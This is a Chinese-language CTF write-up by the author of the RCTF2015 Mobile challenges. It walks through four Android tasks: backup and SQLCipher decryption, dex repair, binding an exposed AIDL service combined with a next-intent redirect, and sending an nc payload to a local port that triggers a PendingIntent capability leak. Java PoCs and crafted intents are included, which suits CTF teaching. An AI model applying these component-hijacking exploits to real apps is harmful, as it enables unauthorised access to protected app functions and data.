@@ -1,0 +1,319 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">RCTF2015-Mobile-出题思路及Writeup</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Xbalien</a> <span class="bull">·</span> <time title="2015/11/18 10:16" ui-time="" datetime="2015/11/18 10:16" class="published ng-binding ng-isolate-scope">2015/11/18 10:16</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>@Xbalien ROIS</p><p>从最初CTF上apk的简单反编译到现在各种加固逆向，难度已经上升了好多个级别。但感觉除了ACTF，多数的Mobile题目还是以逆向为主。此次作为ROIS成员有幸能参与到RCTF2015的出题工作中，于是尝试了一些新的出题思路，导致大家做题都很不适应，也把大家坑了一波。欢迎建议、意见、吐槽。</p><p><strong>这次RCTF单独了一个Mobile类别，主题是漏洞，希望和大家一起探讨。</strong></p><h1>0x00 Mobile100-FlagSystem</h1><hr><blockquote><p>Show me the flag. (The flag should include RCTF{}). <a href="https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/FlagSystem/ab_2e204fe0ec33b1689f1c47bd60a9770c">ab_2e204fe0ec33b1689f1c47bd60a9770c</a></p></blockquote><h2>出题思路：Android backup漏洞 + 本地密码弱保护</h2><p>该题给出了一个修改过的backup.ab，稍微需改了ab的头部，version以及compress。直接使用abe进行提取的话需要根据代码简单修复一下ab头部。提取出来后发现有两个备份apk文件。</p><p>com.example.mybackup<br>com.example.zi</p><p>其中mybackup里提供了一个经过sqlcipher加密过的BOOKS.db.该数据库里存储了flag，只要解密该数据库之后即可获取flag。</p><p>密码直接可以通过反编译看到：</p><pre><code>#!java
+public BooksDB(Context context) {
+    super(context, "BOOKS.db", null, 1);
+    this.k = Test.getSign(context);
+    this.db = this.getWritableDatabase(this.k);
+    this.dbr = this.getReadableDatabase(this.k);
+}
+</code></pre><p>getSign为自己写的获取签名，然后计算"SHA1",直接利用jeb反编译结果编写代码即可获取key,然后坑点就是要选择尝试正确的sqlcipher版本进行解密即可。</p><pre><code>sqlite&gt; PRAGMA KEY = 'KEY';
+sqlite&gt; .schema
+CREATE TABLE android_metadata (locale TEXT);
+CREATE TABLE books_table (book_id INTEGER primary key autoincrement, book_name t
+ext, book_author text);
+sqlite&gt; select * from books_table
+</code></pre><p>或者利用backup的apk中提供的sqlcipher库进行重写读取数据库也是可以获取到BOOKS.db内容。</p><h1>0x01 Mobile200-Where</h1><hr><blockquote><p>Where is the flag.(The flag should include RCTF{}) <a href="https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/Where/misc_5b0a7ae29fe01c7a76a19503e1e0273e">misc_5b0a7ae29fe01c7a76a19503e1e0273e</a></p></blockquote><h2>出题思路：炸弹引爆 + dex结构修复</h2><p>该题的定位是杂项题，给了一个apk，但apk啥都没做。在assets目录下存在了一个abc文件，打开后可以看到是损坏的dex header，只要根据dex header其他相关结构把各id_size都修复。</p><p>剩下就是要寻找到隐藏起来的dex body.参考聚安全博客<a href="http://jaq.alibaba.com/blog.htm?spm=0.0.0.0.v5UAtC&amp;id=76">[1]</a>，我在META-INF目录里隐藏了一个y，并把加密的dex <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="274548435ec39c82c2a8adc0bc9fc2a294c2ad87c288a1c39886c1a6886c627e1a6a4e5444674e494117">[email&#160;protected]</a>#fjhx11.DEX=en(dex body)，aes-128-cbc存放在CERT.RSA尾部，这样一来主apk是能正常安装的。</p><p>其实这道题目我描述的不太清楚，坑了一波，所谓的KEY其实只是openssl的-pass，通过KEY生成真正的key以及iv。</p><p>通过相关的openssl操作<code>openssl enc -aes-128-cbc -d -k <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0e43677d6d4e6760683e">[email&#160;protected]</a>#fjhx11 -nosalt -in xxx -out xxx2</code>将dex body解密后与dex header进行拼接，jeb反编译后结果如下：</p><pre><code>#!java
+public class MainActivity extends ActionBarActivity {
+    public String seed;
+
+    public MainActivity() {
+        super();
+        this.seed = "m3ll0t_yetFLag";
+    }
+
+    protected void onCreate(Bundle savedInstanceState) {
+    }
+
+    ...
+}
+</code></pre><p>这题我把onCreate方法的code insns扣了出来，查看assembly：</p><pre><code>.method protected onCreate(Bundle)V
+      .registers 8
+      .param p1, "savedInstanceState"
+00000000  nop
+      .prologue
+00000002  nop
+00000004  nop
+00000006  nop
+00000008  nop
+0000000A  nop
+0000000C  nop
+0000000E  nop
+00000010  nop
+00000012  nop
+00000014  nop
+00000016  nop
+00000018  nop
+0000001A  nop
+0000001C  nop
+0000001E  nop
+00000020  nop
+      .local v1, strb:Ljava/lang/StringBuilder;
+00000022  nop
+</code></pre><p>通过判断长度可以知道y其实就是扣出来的code insns.直接覆盖在次反编译可以看到onCreate方法中对seed进行了一些修改，最终得到最后flag.</p><h1>0x02 Mobile350-Load</h1><hr><blockquote><p>This APK has a vulnerability,Can you load the flag? Try it. <a href="https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/Load/WaWaWa_0bb98521a9f21cc3672774cfec9c7140">WaWaWa_0bb98521a9f21cc3672774cfec9c7140</a></p></blockquote><h2>出题思路：暴露组件aidl利用 + next_intent</h2><p>该题的出题思路是在某次自己参加众测中积累的。该题都在强调Load，通过反编译apk，发现有一个Load类，声明了很多native方法，然后WebActivity中调用了一个loadUrl来加载网页。该题本意是通过正确调用的loadUrl，加载flag网址获取flag。</p><p>但为了增加逆向难度,APK启动后会检测一下so的调用者，flag放在vps,增加了so-java来回jni交互的逻辑，最后加上了娜迦的so加固。如果真是逆向做出来的，真的是不得不服了。</p><p>该题在放出提示exposed component exploit后，复旦六星战队在比赛结束那个时间获得了flag，但最终没有按时提交flag比较遗憾。</p><p>Manifest:normal权限保护CoreService,未导出组件WebActivity,导出组件MiscService</p><pre><code>&lt;permission android:name="com.example.wawawa.permission.CORE_SERVICE" android:protectionLevel="normal" /&gt;
+&lt;activity android:name=".WebActivity" /&gt;
+&lt;service android:name=".MiscService"&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name="com.example.wawawa.Misc_SERVICE" /&gt;
+    &lt;/intent-filter&gt;
+&lt;/service&gt;
+&lt;service android:name=".CoreService" android:permission="com.example.wawawa.permission.CORE_SERVICE"&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name="com.example.wawawa.CORE_SERVICE" /&gt;
+    &lt;/intent-filter&gt;
+&lt;/service&gt;
+</code></pre><p>WebActivity：通过接收处理一个传递过来的序列化对象，作为Load.decode的参数可以进行flagUrl的解码，之后加载解码后的网页进而获取flag，但该组件未导出.</p><pre><code>#!java
+public void onCreate(Bundle arg6) {
+    super.onCreate(arg6);
+    this.setContentView(2130903068);
+    this.a = this.findViewById(2131034173);
+    this.a.setWebViewClient(new g(this));
+    Serializable v0 = this.getIntent().getSerializableExtra("KEY");
+    if(v0 == null || !(v0 instanceof b)) {
+        Toast.makeText(((Context)this), "flag is null", 1).show();
+    }
+    else {
+        String v1 = ((b)v0).a();
+        String v2 = ((b)v0).b();
+        if("loading".equals(((b)v0).c())) {
+            if(v1 != null &amp;&amp; v2 != null) {
+                this.a.loadUrl(Load.decode(((Context)this), v1, v2, a.a));
+                Toast.makeText(((Context)this), "flag loading ...", 1).show();
+                return;
+            }
+
+            this.a.loadUrl("file:///android_asset/666");
+        }
+    }
+}
+</code></pre><p>MiscService:存在next&#95;intent特征，可以控制CLASS&#95;NAME启动组件</p><pre><code>#!java
+public Intent a(Intent arg4) {
+    Intent v0 = new Intent();
+    v0.setClassName(this.getApplicationContext(), arg4.getStringExtra("CLASS_NAME"));
+    v0.putExtras(arg4);
+    v0.setFlags(268435456);
+    return v0;
+}
+</code></pre><p>CoreService:存在暴露的AIDL接口,多处使用了Load的native方法。</p><pre><code>#!java
+class b extends a {
+    b(CoreService arg1) {
+        this.a = arg1;
+        super();
+    }
+
+    public String a() throws RemoteException {
+        c v0 = new c(Load.getUrl(this.a), Load.getToken(this.a));
+        Thread v1 = new Thread(((Runnable)v0));
+        v1.start();
+        try {
+            v1.join();
+        }
+        catch(InterruptedException v1_1) {
+            v1_1.printStackTrace();
+        }
+
+        return v0.a();
+    }
+
+    public String b() throws RemoteException {
+        return null;
+    }
+
+    public String c() throws RemoteException {
+        return Load.getIv(this.a);
+    }
+}
+</code></pre><p>因此，通过仔细分析及猜测逻辑，这个核心服务提供了两个接口: 一个接口通过调用Load的native函数getUrl以及getToken，获取vps-url以及token参数,post到vps-url,若token正确即可获取key. 另一个接口通过Load.getIv自己本地获取了iv. 因此通过直接利用该暴露了aidl接口可以轻松获得des解密需要的key和iv.</p><p>POC如下：</p><pre><code>#!java
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_bind);
+    try {
+        ComponentName com = new ComponentName("com.example.wawawa", "com.example.wawawa.CoreService");  
+        Intent intent = new Intent();
+        intent.setComponent(com);
+        bindService(intent, connD, Context.BIND_AUTO_CREATE);
+    } catch (Exception e) {
+    }
+
+}
+
+private d da;
+
+private ServiceConnection connD = new ServiceConnection() {
+
+    @Override
+    public void onServiceConnected(ComponentName name, IBinder service) {
+        da = d.Stub.asInterface(service);
+
+        try {
+            System.out.println(da.c());
+            System.out.println(da.a());
+        } catch (RemoteException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void onServiceDisconnected(ComponentName name) {
+        // TODO Auto-generated method stub
+    }
+
+};
+</code></pre><p>接着，通过next_intent传递key和iv,即可开启webActivity，des解密成功后，加载正确flagUrl。获取flag。</p><pre><code>#!java
+String key = etKey.getText().toString();
+String iv = etIv.getText().toString();
+String content = "loading";
+b data = new b(key,iv, content);
+Intent intent = new Intent("com.example.wawawa.Misc_SERVICE");
+intent.putExtra("CLASS_NAME", "com.example.wawawa.WebActivity");
+intent.putExtra("KEY", data);
+startService(intent);
+</code></pre><h1>0x03 Mobile450-Target</h1><hr><blockquote><p>This APK has a vulnerability, please use it to start the target activity.The flag should include RCTF{}. <a href="https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/Target/Package_b6411947d3b360182e8897be40064023">Package_b6411947d3b360182e8897be40064023</a></p></blockquote><h2>出题思路：开放本地端口 + PendingIntent + 运行时自窜改</h2><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="03ebaca6eaa19be684b9eaa19be5839eebb4ace68c81eb8380e7b98543e6b38ceb8eb4e58a8eea9fb1e6b395e6b395eba491e49987e5b686ebb38b426d67716c6a67">[email&#160;protected]</a>开放网络端口的安全风险<a href="http://drops.wooyun.org/mobile/6973">[2]</a>，X-team的PendingIntent双无intent可导致的能力泄露<a href="http://xteam.baidu.com/?p=77">[3]</a> 以及运行时自篡改代码<a href="http://blog.csdn.net/freshui/article/details/13620647">[4]</a>。</p><p>出题本意是，通过该apk开放的一个本地端口，传递相关参数，最后触发主dex中的PendingIntent双无Intent的通知，获取相关通知后修改intent内容开启TargetActivty.其中向端口中传递的能够正确触发双无Intent的参数的md5(输入参数)即为flag。（但dex几处代码经过so的自篡改，因此需要获取真正加载的代码）</p><p>Manifest：TargetActiviy使用了signature的权限进行保护</p><pre><code>&lt;permission android:name="com.example.packagedetail.permission.TARGET" android:protectionLevel="signature" /&gt;
+
+    &lt;activity android:name="com.ui.TargetActivity" android:permission="com.example.packagedetail.permission.TARGET"&gt;
+        &lt;intent-filter&gt;
+            &lt;action android:name="com.example.packagedetail.TAEGET" /&gt;
+            &lt;category android:name="android.intent.category.DEFAULT" /&gt;
+        &lt;/intent-filter&gt;
+    &lt;/activity&gt;
+</code></pre><p>因此，想要启用该activity需要有next-intent或者能力泄露，通过查看ListenService定位到了一处双无intent。因此触发ListenService逻辑至allow代码逻辑即可（allow逻辑代码是13年开发的重打包加固的app中修改的<a href="https://github.com/Xbalien/GuardDroid">[5]</a>）。</p><pre><code>#!java
+Intent v2_1 = new Intent();
+if("reject".equals(arg9)) {
+    v2_1.setClassName(this.a, "com.ui.MainTabHostActivity");
+    v1.setLatestEventInfo(this.a.getApplicationContext(), "Guard", ((CharSequence)arg10), 
+            PendingIntent.getActivity(this.a, 0, v2_1, 0));
+    ((NotificationManager)v0).notify(1, v1);
+    Log.d("CoreListenService", arg9);
+}
+if("allow".equals(arg9)) {
+    v1.setLatestEventInfo(this.a.getApplicationContext(), "Guard", ((CharSequence)arg10), 
+            PendingIntent.getActivity(this.a, 0, v2_1, 0));
+    ((NotificationManager)v0).notify(1, v1);
+    Log.d("CoreListenService", arg9);
+}
+</code></pre><p>该逻辑是，在内存中存在一个设定了allow的条件，就是name为test,perm为READ_F的消息才能被设置为allow。</p><pre><code>#!java
+if(GuardApplication.a.get("test") == null) {
+        GuardApplication.a.put("test", Integer.valueOf(0));
+    }
+
+GuardApplication.a.put("test", Integer.valueOf(b.b.get("READ_F").intValue() | GuardApplication
+        .a.get("test").intValue()));
+</code></pre><p>但listenService是未导出组件，无法直接调用，因此只能另寻他路。</p><p>在apk assets目录下存放了一个d文件，该文件其实是加密后的dex文件。通过查看加载调用GuardApplication可以发现：</p><p>首先通过b()对d复制、解密操作，解密之后加载com.example.dynamic.Init类，执行其中的a方法。 b()最终是异或36，但是该异或代码在运行时加载的so中进行了修改，异或了18，因此通过36异或出来的d并不是真正的dex。加载后的dex以及odex我也删除掉了。</p><pre><code>#!java
+public void a() {
+    this.b();
+    String v1 = this.e.getCacheDir().getPath();
+    DexClassLoader v0 = new DexClassLoader(String.valueOf(this.e.getDir(Load.b, 0).getPath()) + 
+            "/" + Load.d, v1, null, this.e.getClassLoader());
+    try {
+        Class v0_2 = v0.loadClass("com.example.dynamic.Init");
+        Constructor v2 = v0_2.getConstructor(Context.class);
+        Method v0_3 = v0_2.getMethod("a");
+        this.f = v2.newInstance(this.e);
+        v0_3.invoke(this.f);
+    }
+    catch(Exception v0_1) {
+        v0_1.printStackTrace();
+    }
+
+    new File(v1, "bb.dex").delete();
+    new File(this.e.getDir(Load.b, 0).getPath(), "bb.jar").delete();
+}
+</code></pre><p>so存在简单的ptrace以及traceid反调试，想办法获取到d.dex后，进行反编译：可以知道该dex加载后开启了127.0.0.1：20151端口。处于监听状态获取数据交互。</p><pre><code>#!java
+public ServerSocketThread(Context arg2) {
+    super();
+    this.c = arg2;
+    this.b = 20151;
+}
+
+public final void run() {
+    try {
+        this.a = new ServerSocket();
+        this.a.bind(new InetSocketAddress(InetAddress.getLocalHost(), this.b));
+        while(true) {
+            Socket v0_1 = this.a.accept();
+            Log.d("socket", "Socket Acccept!Address=" + v0_1.getInetAddress().toString());
+            if(v0_1 != null) {
+                new b(this.c, v0_1).start();
+            }
+
+            Log.d("socket", "Socket Execute Thread Started!Address=" + v0_1.getInetAddress().toString());
+        }
+    }
+    catch(Exception v0) {
+        v0.printStackTrace();
+        return;
+    }
+}
+</code></pre><p>其中，处理逻辑中，找到一处可以通过接受端口传递进来的参数，进行不同的逻辑处理，最后解析参数触发startservice，调用主dex中任意service以及extras的逻辑。</p><pre><code>#!java
+public class a {
+    public static final String b = "mobile://rois/?";
+
+    static {
+        a.a = new HashMap();
+        a.a.put("start", Integer.valueOf(3));
+        a.a.put("handle", Integer.valueOf(4));
+        a.a.put("test", Integer.valueOf(1));
+        a.a.put("location", Integer.valueOf(2));
+        a.a.put("getinfo", Integer.valueOf(5));
+        a.a.put("sms", Integer.valueOf(6));
+        a.a.put("contact", Integer.valueOf(7));
+    }
+
+    public a() {
+        super();
+    }
+}
+</code></pre><p>因此，<code>nc 127.0.0.1 20151</code>，向该端口传递数据，尝试触发该逻辑，以下逻辑为需要触发的逻辑。接受参数后，会对<code>xx=xx&amp;xx=xx&amp;xx=xx</code>之类的输入，进行解析。获取到相关的输入数据后，构造特定的Intent，包括组件名，extras数据等等，最后通过startservice将intent传递到主dex的逻辑中。</p><pre><code>#!
+label_184:
+    if(!v1[1].startsWith("cm=")) {
+        goto label_93;
+    }
+
+    if(!v1[2].startsWith("ac=")) {
+        goto label_93;
+    }
+
+    if(!v1[3].startsWith("extr=")) {
+        goto label_93;
+    }
+
+    v0_4 = v2.getQueryParameter("cm");
+    v1_1 = v2.getQueryParameter("ac");
+    String v2_2 = v2.getQueryParameter("extr");
+    Intent v3_1 = new Intent();
+    if(v0_4 != null) {
+        v3_1.setComponent(new ComponentName(this.a, v0_4));
+    }
+
+    if(("true".equals(v1_1)) &amp;&amp; v2_2 != null) {
+        System.out.println(v2_2);
+        v0_5 = v2_2.split("-");
+        if(v0_5.length == 6) {
+            v3_1.putExtra(v0_5[0], v0_5[1]);
+            v3_1.putExtra(v0_5[2], v0_5[3]);
+            v3_1.putExtra(v0_5[4], v0_5[5]);
+        }
+    }
+
+    this.a.startService(v3_1);
+</code></pre><p>触发调用listenService的逻辑后，intent根据相关解析相关逻辑约束，在满足某约束的输入下，进而发送双无intent的通知。该输入MD5就是所谓的flag。</p><p>（但在ListenService中我留了一个坑，v1.getString("perm", "per")，其中key "perm"我在so自篡改成了PERM）。</p><pre><code>#!java
+public int onStartCommand(Intent arg5, int arg6, int arg7) {
+    if(arg5 != null) {
+        Bundle v1 = arg5.getExtras();
+        Iterator v2 = v1.keySet().iterator();
+        while(v2.hasNext()) {
+            v2.next();
+        }
+
+        if(v1 != null) {
+            String v0 = v1.getString("name", "name");
+            if("log".equals(v1.getString("action", "act"))) {
+                this.b = new com.service.ListenService$b(this, ((Context)this), v0, v1.getString(
+                        "perm", "per"));
+                this.c = new Thread(this.b);
+                this.c.start();
+            }
+        }
+    }
+
+    return super.onStartCommand(arg5, arg6, arg7);
+}
+</code></pre><p>因此向监听端口发送：<code>action=start&amp;cm=com.service.ListenService&amp;ac=true&amp;extr=name-test-action-log-PERM-READ_F</code></p><p>即可触发allow通知，该通知存放一个双无intent.再通过修改intent即可触发TargetActivity.</p><p>ps:自己反编译混淆后的apk才发现看得还是挺蛋疼的，又坑了大家一波。</p><h1>0x04 小结</h1><hr><p>此次RCTF2015 Mobile类题目，我尝试了一些漏洞的思路进行出题，也许还会存在我没有考虑到的问题，也或许获取flag的方式让大家不解，包括让大家入坑的都请见谅哈。希望有兴趣童鞋可以尝试把Mobile的CTF题出得更全面、更有意思。</p><p>最后。参加RCTF的小伙伴们。</p><h1>0x05 参考</h1><hr><ol><li><a href="http://jaq.alibaba.com/blog.htm?spm=0.0.0.0.v5UAtC&amp;id=76">http://jaq.alibaba.com/blog.htm?spm=0.0.0.0.v5UAtC&amp;id=76</a></li><li><a href="http://drops.wooyun.org/mobile/6973">http://drops.wooyun.org/mobile/6973</a></li><li><a href="http://xteam.baidu.com/?p=77">http://xteam.baidu.com/?p=77</a></li><li><a href="http://blog.csdn.net/freshui/article/details/13620647">http://blog.csdn.net/freshui/article/details/13620647</a></li><li><a href="https://github.com/Xbalien/GuardDroid">https://github.com/Xbalien/GuardDroid</a></li></ol><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/2736" rel="bookmark" id="re1">Samsung S Voice attack</a></li><li><a href="http://drops.wooyun.org/tips/4393" rel="bookmark" id="re2">Android Broadcast Security</a></li><li><a href="http://drops.wooyun.org/mobile/13676" rel="bookmark" id="re3">Android Bound Service攻击</a></li><li><a href="http://drops.wooyun.org/papers/3912" rel="bookmark" id="re4">安卓Bug 17356824 BroadcastAnywhere漏洞分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">kevinchowsec</span> <span class="reply-time">2016-03-24 18:02:21</span></div><p></p><p>6到爆！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaokong</span> <span class="reply-time">2015-12-07 15:35:10</span></div><p></p><p>66666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小花</span> <span class="reply-time">2015-11-27 09:48:14</span></div><p></p><p>小花哥V5</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Nicky</span> <span class="reply-time">2015-11-18 16:30:54</span></div><p></p><p>666666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">where_on</span> <span class="weibo"></span> <span class="reply-time">2015-11-18 15:54:20</span></div><p></p><p>哎哟，小花哥</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">超威蓝猫</span> <span class="reply-time">2015-11-18 15:06:02</span></div><p></p><p>66666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">r1fl3333</span> <span class="reply-time">2015-11-18 14:54:18</span></div><p></p><p>66666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小荷才露尖尖角</span> <span class="reply-time">2015-11-18 11:49:14</span></div><p></p><p>感谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">he1m4n6a</span> <span class="reply-time">2015-11-18 11:03:34</span></div><p></p><p>66666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Zhe</span> <span class="reply-time">2015-11-18 10:54:45</span></div><p></p><p>哟哟哟哟，抢个沙发，支持下</p><p></p></div></div></div></div></div></main>
